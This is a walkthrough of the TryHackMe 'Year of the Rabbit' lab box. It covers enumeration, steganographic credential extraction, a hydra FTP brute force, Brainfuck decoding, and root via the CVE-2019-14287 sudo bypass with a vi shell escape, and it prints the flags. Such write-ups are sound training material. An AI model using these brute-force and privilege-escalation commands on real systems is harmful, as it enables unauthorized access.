# Year of the Rabbit - TryHackMe Walkthrough

## 1. Challenge Overview
**Name:** Year of the Rabbit  
**Category:** Boot2Root / Steganography / Privilege Escalation  
**Difficulty:** Easy  
**Points/Reward:** N/A (Standard TryHackMe Room)  
**Challenge Prompt:** 
> Let's have a nice gentle start to the New Year!
> Can you hack into the Year of the Rabbit box without falling down a hole?
> (Please ensure your volume is turned up!)

---

## 2. Setup & Enumeration

**Initial Assessment:** 
We were provided with a single target IP address (`10.48.166.218`). The first step was to identify open ports and available services to establish our attack surface.

**Reconnaissance Tools:**
```bash
nmap -sC -sV -oA nmap_init 10.48.166.218
```

**Terminal Output:**
```text
Nmap scan report for 10.48.166.218
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.10 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

**Web Enumeration:**
We performed web directory enumeration using `gobuster`:
```bash
gobuster dir -u http://10.48.166.218/ -w /usr/share/wordlists/dirb/common.txt -q
```

**Terminal Output:**
```text
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.48.166.218/assets/]
/index.html           (Status: 200) [Size: 7853]
/server-status        (Status: 403) [Size: 278]
```

Inspecting `/assets/style.css` revealed a hidden developer comment:
```bash
curl -s http://10.48.166.218/assets/style.css
```

**Terminal Output:**
```css
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
```

Accessing `/sup3r_s3cr3t_fl4g.php` triggered an HTTP 302 redirect. Using `curl -v` allowed us to see the destination.
```bash
curl -v http://10.48.166.218/sup3r_s3cr3t_fl4g.php
```

**Terminal Output:**
```text
< HTTP/1.1 302 Found
< Date: Sat, 06 Jun 2026 13:03:48 GMT
< Server: Apache/2.4.10 (Debian)
< Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
```

---

## 3. Rabbit Holes & Failed Attempts
*   **Anonymous FTP:** Before finding the hidden web directories, I attempted to log into the FTP server using the `anonymous` user. This was disabled (`530 Permission denied`).
*   **The RickRoll:** The challenge prompt hinted at keeping the volume up. The `/assets/RickRolled.mp4` file is a classic CTF distraction. The real clue was in the CSS file.

---

## 4. Exploitation & Solution

**The Vulnerability:** 
Poor operational security (OpSec) involving plain-text credentials in image trailers and weak encoding for sensitive files.

**Step-by-Step Execution:**

1.  **Extracting the Password List:** We used `strings` on `Hot_Babe.png` to find hidden data.
    ```bash
    strings Hot_Babe.png | tail -n 15
    ```

    **Terminal Output:**
    ```text
    Eh, you've earned this. Username for FTP is ftpuser
    One of these is the password:
    Mou+56n%QK8sr
    1618B0AUshw1M
    ...
    5iez1wGXKfPKQ
    nJ90XzX&AnF5v
    ```

2.  **Brute-Forcing FTP:** Using `hydra` with the extracted list.
    ```bash
    hydra -l ftpuser -P ftp_passwords.txt ftp://10.48.166.218
    ```

    **Terminal Output:**
    ```text
    [DATA] attacking ftp://10.48.166.218:21/
    [21][ftp] host: 10.48.166.218   login: ftpuser   password: 5iez1wGXKfPKQ
    1 of 1 target successfully completed, 1 valid password found
    ```

3.  **Decoding Credentials:** We downloaded `Eli's_Creds.txt` from FTP and decoded the Brainfuck code.

    **The Decoder Script (`bf_decoder.py`):**
    ```python
    import sys

    def brainfuck_interpreter(code):
        code = "".join([c for c in code if c in "><+-.,[]"])
        memory = [0] * 30000
        ptr = 0
        pc = 0
        loops = []
        jumps = {}
        for i, char in enumerate(code):
            if char == "[": loops.append(i)
            elif char == "]":
                if loops:
                    start = loops.pop()
                    jumps[start] = i
                    jumps[i] = start
        output = []
        while pc < len(code):
            char = code[pc]
            if char == ">": ptr += 1
            elif char == "<": ptr -= 1
            elif char == "+": memory[ptr] = (memory[ptr] + 1) % 256
            elif char == "-": memory[ptr] = (memory[ptr] - 1) % 256
            elif char == ".": output.append(chr(memory[ptr]))
            elif char == "[":
                if memory[ptr] == 0: pc = jumps[pc]
            elif char == "]":
                if memory[ptr] != 0: pc = jumps[pc]
            pc += 1
        return "".join(output)

    if __name__ == "__main__":
        with open(sys.argv[1], "r") as f:
            print(brainfuck_interpreter(f.read()))
    ```

    **Terminal Output (Execution):**
    ```text
    $ python3 bf_decoder.py Eli's_Creds.txt
    User: eli
    Password: DSpDiM1wAEwid
    ```

---

## 5. Post-Exploitation / Privilege Escalation

**Lateral Movement (Eli -> Gwendoline):**
We SSH'd in as `eli`.

**Terminal Output:**
```text
eli@10.48.166.218's password: 
1 new message
Message from Root to Gwendoline:
"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
```

We found the message in `/usr/games/s3cr3t/`:
```bash
cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

**Terminal Output:**
```text
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!
```

**Privilege Escalation (Gwendoline -> Root):**
After SSH'ing as `gwendoline`, we checked `sudo -l`:

**Terminal Output:**
```text
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

Exploiting **CVE-2019-14287** to gain root:
```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

Inside `vi`, we executed the command to read the root flag:
```text
:!cat /root/root.txt
```

**Terminal Output:**
```text
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```

---

## 6. The Flag

**User Flag:** 
`THM{1107174691af9ff3681d2b5bdb5740b1589bae53}`

**Root Flag:** 
`THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}`

---

## 7. Takeaways & Conclusion

*   **Sanitize Development Comments:** Never leave sensitive filenames or paths in client-side files like CSS.
*   **Update Sudo:** CVE-2019-14287 is a critical vulnerability that allows easy root access if the system is unpatched.
*   **Secure Binary Permissions:** Avoid giving `sudo` access to binaries with shell escape capabilities like `vi`.
